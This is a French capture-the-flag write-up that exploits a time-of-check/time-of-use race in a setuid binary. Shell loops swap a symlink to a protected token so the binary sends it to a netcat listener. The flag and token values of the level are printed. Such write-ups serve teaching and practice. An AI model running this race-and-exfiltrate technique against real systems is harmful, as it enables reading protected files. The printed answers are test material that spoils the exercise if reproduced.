s5cAJpM8ev6XHw998pRWG728z

On à un binaire et un flag protégé. 
on examine le binaire avec ltrace

echo 'toto' > /tmp/toto

ltrace ./level10 /tmp/test toto

On à 
	access("/tmp/test", 4)
	fflush [host]:6969
	socket(2, 1, 0)
	inet_addr("toto")
	htons(6969, 1,0,0,0)
	connect(3, 0xbffff71c, 16, 0, 0)
	et un prinft( %s) ou %s = hostname

on essaie d'écouter le port 6969
	netcat -z -v 192.XXX.1.21 4242
		Connection to 192.168.1.21 4242 port [tcp/*] succeeded!
	netcat -z -v 192.XXX.1.21 6969
		netcat: connect to 192.XXX.1.21 port 6969 (tcp) failed: Connection refused

avec netstat -lntu on voit qu'il n'y à pas de port 6969

./level10 /tmp/faille 192.XXX.1.21
Connecting to 192.XXX.1.21:6969 .. Unable to connect to host 192.XXX.1.21

netcat -l 6969 pour écouter un port, ajouter l'option K pour garder la connexion ouverte

./level10 /tmp/faille 192.XXX.1.21
Connecting to 192.XXX.1.21:6969 .. Connected!
Sending file .. wrote file!


On cherche à ouvrir token par le biais de level10

on tente un symlink
	dont have access

On cherche une vulnérabilité dans les fonctions appelé par le binaire.

	man access() :
		Utiliser access() pour vérifier si un utilisateur a le droit, par exemple, 
		d'ouvrir un fichier avant d'effectuer réellement l'ouverture avec open(2), 
		risque de créer un trou de sécurité. En effet, l'utilisateur peut exploiter le petit intervalle de temps entre la vérification 
		et l'accès pour modifier le fichier (via un lien symbolique en général). Pour cette raison, l'utilisation de cet appel système 
		devrait être évitée.

possible attaque Time of Check to Time of Update race

de ce type: 
// After the access check
symlink("/etc/passwd", "file");
// Before the open, "file" points to the password database

echo toto > /tmp/suspect
echo troll > /tmp/troll

ln -sf /tmp/troll /tmp/suspect
ln -sf /home/user/level10/token /tmp/suspect

run gdb level10
set args /tmp/suspect 192.XXX.1.21
break open
	access
On run, après access et avant open, on change la source avec un lien symbolique,
résultats, impossible d'ouvrir le fichier.

En suivant les indications pour ce type de faille, on peut faire 2 scripts.
Un qui tourne en boucle en modifiant les liens symbolique, et un autre qui run level10.
On écoute le résultat dans netcat.

while true; do ln -s /tmp/troll /tmp/suspect; ln -sf /home/user/level10/token /tmp/suspect; done
	failed to create symbolic link `/tmp/suspect': File exists
on rajoute le flag -fs

while true; do ln -sf /tmp/troll /tmp/suspect; ln -sf /home/user/level10/token /tmp/suspect; done

while true; do ./level10 /tmp/suspect 192.XXX.1.21; done

on écoute sur netcat 6969, on trouve rapidement le flag: woupa2yuojeeaaed06riuj63c
su flag10 et gettoken
token: feulo4b72j7edeahuete3no7c

éviter la faille: user faccessat()